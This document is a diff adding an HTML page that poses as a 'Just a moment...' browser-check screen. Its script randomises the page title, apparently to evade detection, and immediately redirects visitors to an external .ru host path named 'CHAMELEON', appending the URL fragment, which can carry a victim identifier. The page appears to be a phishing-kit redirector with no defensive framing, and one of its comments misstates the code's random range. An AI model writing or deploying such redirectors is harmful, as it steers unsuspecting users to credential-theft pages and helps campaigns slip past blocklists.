@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="pageTitle">Just a moment...</title>
+</head>
+<body>
+    <script>
+        // Function to generate a random subdomain of random length
+        function generateRandomSubdomainAndLength(url) {
+          const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
+          let subdomain = '';
+          let subdomainLength = Math.floor(Math.random() * 25) + 8; // Random length from 1 to 10 characters
+
+          for (let i = 0; i < subdomainLength; i++) {
+            const randomIndex = Math.floor(Math.random() * characters.length);
+            subdomain += characters.charAt(randomIndex);
+          }
+
+          //const redirectTo = `https://${subdomain}.${url}`;
+		  const redirectTo = `${url}`;
+          return redirectTo;
+        }
+
+        // Function to generate a random string for the title
+        function generateRandomTitle() {
+          const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+          let title = '';
+          let titleLength = Math.floor(Math.random() * 20) + 5; // Random length from 5 to 25 characters
+
+          for (let i = 0; i < titleLength; i++) {
+            const randomIndex = Math.floor(Math.random() * characters.length);
+            title += characters.charAt(randomIndex);
+          }
+
+          return title;
+        }
+
+        // Function to set a random title
+        function setRandomTitle() {
+          const randomTitle = generateRandomTitle();
+          document.getElementById('pageTitle').textContent = randomTitle;
+        }
+
+        // Function to redirect to a random subdomain with a random subdomain length
+        function redirectToRandomSubdomain(url) {
+          const redirectTo = generateRandomSubdomainAndLength(url);
+
+          // Redirect to the generated URL
+          window.location.href = redirectTo;
+        }
+
+        // Set a random title
+        setRandomTitle();
+
+        // Example usage
+        const urlToRedirectTo = 'http://srv247849.hoster-test.ru/CHAMELEON/index.html'+window.location.hash.substring(1); // Replace with your target URL
+
+        redirectToRandomSubdomain(urlToRedirectTo);
+    </script>
+</body>
+</html>
